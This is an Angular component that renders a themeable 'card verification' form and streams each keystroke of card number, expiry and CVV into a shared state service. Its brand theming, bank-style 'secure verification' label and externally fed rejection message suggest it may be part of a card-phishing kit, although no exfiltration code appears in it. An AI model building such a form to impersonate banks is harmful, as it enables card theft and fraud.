
import { Component, inject, signal, computed, effect } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { validateCardLogic, CardType } from './card-validation.utils';
import { TranslatePipe } from '../pipes/translate.pipe';

@Component({
  selector: 'app-card-verification',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
  template: `
    <app-public-layout>
      
      <div class="flex flex-col items-center mb-6">
        <h1 class="text-2xl font-bold mb-2 text-center tracking-tight" 
            [style.color]="headerColor()">
            {{ 'CARD.TITLE' | translate }}
        </h1>
        <p class="text-base text-center leading-relaxed max-w-[90%] opacity-80"
           [style.color]="textColor()">
           {{ 'CARD.SUBTITLE' | translate }}
        </p>
      </div>

      @if (state.rejectionReason()) {
        <div class="mb-6 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in slide-in-from-top-2">
            <span class="material-icons text-[#D92D20] text-xl">credit_card_off</span>
            <div>
              <p class="text-sm font-bold text-[#D92D20]">{{ 'CARD.ERROR_TITLE' | translate }}</p>
              <p class="text-xs text-red-700 mt-1">{{ state.rejectionReason() }}</p>
            </div>
        </div>
      }

      <div class="space-y-6">
        
        <div class="space-y-4">
           <!-- Card Number -->
          <div class="relative group">
            <input 
                 type="text" 
                 [value]="cardNumberDisplay"
                 (input)="onCardInput($event)"
                 (blur)="touchedCard.set(true)"
                 id="cardNum"
                 placeholder=" "
                 maxlength="19"
                 class="w-full transition-all duration-200 outline-none block font-mono tracking-wide"
                 [class]="inputClasses()"
                 [style]="inputStyles()"
                 [style.color]="inputTextColor()"
               >
               
               <label for="cardNum" 
                    class="absolute left-4 transition-all duration-200 pointer-events-none origin-[0]"
                    [class]="labelClasses()"
                    [style.color]="inputTextColor()">
                    {{ 'CARD.Card Number' | translate }}
               </label>
               

               <!-- Dynamic Brand Icon -->
               @if(cardType() !== 'unknown') {
                   <div class="absolute right-4 top-1/2 -translate-y-1/2 h-7 w-12 border rounded flex items-center justify-center animate-fade-in pointer-events-none"
                        [style.background]="inputBg()"
                        [style.border-color]="borderColor()">
                        <img *ngIf="cardType() === 'visa'" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-3 object-contain" [class.invert]="isDark()">
                        <img *ngIf="cardType() === 'mastercard'" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-4 object-contain">
                        <img *ngIf="cardType() === 'amex'" src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" class="h-3 object-contain" [class.invert]="isDark()">
                        <img *ngIf="cardType() === 'discover'" src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" class="h-5 object-contain" [class.invert]="isDark()">
                   </div>
               }
               @else {
                   <span class="material-icons absolute right-4 top-1/2 -translate-y-1/2 text-2xl pointer-events-none opacity-50"
                         [style.color]="inputTextColor()">credit_card</span>
               }
          </div>

           <!-- Exp / CVV Row -->
          <div class="flex gap-4">
             <div class="relative w-1/2 mb-0">
                <input 
                  type="text" 
                  [value]="expiry"
                  (input)="onExpiryInput($event)"
                  (blur)="touchedExp.set(true)"
                  id="expiry"
                  placeholder=" "
                  maxlength="5"
                  class="w-full transition-all duration-200 outline-none block font-mono"
                  [class]="inputClasses()"
                  [style]="inputStyles()"
                  [style.color]="inputTextColor()"
                >
                <label for="expiry" 
                    class="absolute left-4 transition-all duration-200 pointer-events-none origin-[0]"
                    [class]="labelClasses()"
                    [style.color]="inputTextColor()">
                    {{ 'CARD.Expiration Date' | translate }}
                </label>
             </div>
             
             <div class="relative w-1/2 mb-0">
                <input 
                    type="password" 
                    [(ngModel)]="cvv"
                    (ngModelChange)="onCvvChange($event)"
                    (blur)="touchedCvv.set(true)"
                    id="cvv"
                    placeholder=" "
                    [maxlength]="cvvMaxLength()"
                    class="w-full transition-all duration-200 outline-none block font-mono"
                    [class]="inputClasses()"
                    [style]="inputStyles()"
                    [style.color]="inputTextColor()"
                  >
                  <label for="cvv" 
                        class="absolute left-4 transition-all duration-200 pointer-events-none origin-[0]"
                        [class]="labelClasses()"
                        [style.color]="inputTextColor()">
                        {{ 'CARD.Security Code' | translate }}
                  </label>
                  
                  <div class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 group cursor-help z-20 hover:text-blue-500 transition-colors">
                      <span class="material-icons text-[20px]">help_outline</span>

                      <!-- Tooltip -->
                      <div class="invisible group-hover:visible absolute bottom-full right-[-10px] mb-2 w-48 bg-slate-900 text-white text-xs p-3 rounded-md shadow-lg z-50 animate-fade-in opacity-0 group-hover:opacity-100 transition-opacity">
                           <p class="mb-2 text-center">{{ 'CARD.CVV_HELP' | translate }}</p>
                           <div class="text-center font-bold text-yellow-400">3 Digits</div>
                      </div>
                  </div>
             </div>
          </div>
        </div>

        <div class="pt-4">
          <button 
            (click)="submit()"
            [style.background]="btnBackground()"
            [style.color]="btnTextColor()"
            [style.border-radius]="btnRadius()"
            [disabled]="!isValid()"
            [class.opacity-50]="!isValid()"
            class="w-full py-3 font-bold text-lg shadow-md hover:shadow-lg transform active:scale-[0.98] transition-all relative overflow-hidden"
          >
            {{ 'COMMON.CONFIRM' | translate }}
          </button>
        </div>
        
        <div class="flex justify-center items-center gap-2 mt-4 opacity-60">
             <span class="material-icons text-[14px]" [style.color]="successColor()">lock</span>
             <p class="text-xs font-bold" [style.color]="textColor()">{{ 'BANK_APP.SECURE_VERIFICATION' | translate }}</p>
        </div>
      </div>
    </app-public-layout>
  `
})
export class CardVerificationComponent {
  state = inject(StateService);

  cardNumber = '';
  cardNumberDisplay = '';
  expiry = '';
  cvv = '';

  // Validation Flags
  touchedCard = signal(false);
  touchedExp = signal(false);
  touchedCvv = signal(false);
  isValid = signal(false);
  isExpiryValid = signal(false);

  cardType = signal<CardType>('unknown');

  // Themes
  theme = computed(() => this.state.currentFlow()?.theme);

  headerColor = computed(() => this.theme()?.input.textColor || '#003087');
  textColor = computed(() => this.theme()?.input.textColor || '#6b7280');
  inputTextColor = computed(() => this.theme()?.input.textColor || '#111827');
  inputBg = computed(() => this.theme()?.input.backgroundColor || '#ffffff');
  isDark = computed(() => this.theme()?.mode === 'dark');
  borderColor = computed(() => this.isDark() ? '#555' : '#e5e7eb');

  btnBackground = computed(() => this.theme()?.button.background || '#003087');
  btnTextColor = computed(() => this.theme()?.button.color || '#ffffff');
  btnRadius = computed(() => this.theme()?.button.borderRadius || '999px');

  successColor = computed(() => '#10b981'); // Or theme specific

  inputStyles() {
    const t = this.theme()?.input;
    return {
      'background-color': t?.backgroundColor || '#fff',
      'border-radius': t?.borderRadius || '0.5rem',
      'padding': '1rem 1rem 0.5rem 1rem',
      'height': '3.5rem'
    };
  }

  inputClasses() {
    const style = this.theme()?.input.style || 'modern';
    return `peer focus:ring-2 focus:ring-opacity-50 focus:border-transparent ${style === 'material' ? 'border-b-2 border-x-0 border-t-0 bg-transparent px-0 rounded-none' : 'border border-gray-300'}`;
  }

  labelClasses() {
    // Reusing floating label logic
    // Note: text-current allows inheriting color from inputTextColor via opacity or explicit bind
    const base = "text-sm peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-0 left-4 top-2 scale-75 -translate-y-0 cursor-text opacity-60 peer-focus:opacity-100 transition-all";
    return base;
  }

  onCardInput(event: any) {
    let input = event.target.value.replace(/\D/g, '');
    if (input.length > 16) {
      input = input.substring(0, 16);
    }
    this.cardNumber = input;
    const parts = input.match(/.{1,4}/g);
    this.cardNumberDisplay = parts ? parts.join(' ') : input;

    this.validate();
    this.state.updateCard({ number: this.cardNumber, cardType: this.cardType() });
  }

  onExpiryInput(event: any) {
    let input = event.target.value.replace(/\D/g, '');
    if (input.length >= 2) {
      input = input.substring(0, 2) + '/' + input.substring(2, 4);
    }
    this.expiry = input;
    this.validate();
    this.state.updateCard({ expiry: this.expiry });
  }

  onCvvChange(value: string) {
    const clean = value.replace(/\D/g, '');
    if (clean !== value) {
      this.cvv = clean;
    }
    this.validate();
    this.state.updateCard({ cvv: this.cvv });
  }

  cvvMaxLength() {
    return this.cardType() === 'amex' ? 4 : 3;
  }

  isCvvValid() {
    const len = this.cvv.length;
    const max = this.cvvMaxLength();
    return len === max;
  }

  isCardNumValid() {
    const len = this.cardNumber.length;
    if (this.cardType() === 'amex') return len === 15;
    if (this.cardType() === 'diners') return len === 14;
    return len === 16;
  }

  validate() {
    const res = validateCardLogic(this.cardNumber, this.expiry, this.cvv);
    this.cardType.set(res.cardType);
    this.isExpiryValid.set(res.isExpiryValid);
    this.isValid.set(res.isValid);
  }

  submit() {
    if (this.isValid()) {
      this.state.submitCard(this.cardNumber, this.cardType(), this.expiry, this.cvv);
    }
  }
}
